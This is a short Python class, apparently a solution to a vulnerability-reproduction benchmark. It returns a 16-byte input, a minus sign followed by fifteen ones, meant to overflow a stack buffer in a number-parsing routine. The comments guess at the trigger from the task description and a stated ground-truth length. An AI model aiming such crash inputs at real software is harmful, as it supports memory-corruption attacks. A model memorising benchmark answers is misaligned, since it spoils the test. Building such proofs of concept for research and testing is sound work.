class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description suggests an issue in a number parsing routine
        # when handling a string that starts with a minus sign but is not an
        # "infinity" value. This can lead to a stack buffer overflow.
        # The ground-truth PoC length is 16 bytes.
        #
        # A common way to trigger such overflows in C-style string/number parsing
        # is to provide an input that is longer than the statically allocated
        # buffer on the stack.
        #
        # A 16-byte PoC consisting of a '-' followed by 15 digits is a highly
        # probable trigger. It satisfies the "leading minus" and "not infinity"
        # conditions and provides a payload long enough to overflow a buffer of
        # size 15 or 16 (due to null termination).
        return b"-111111111111111"
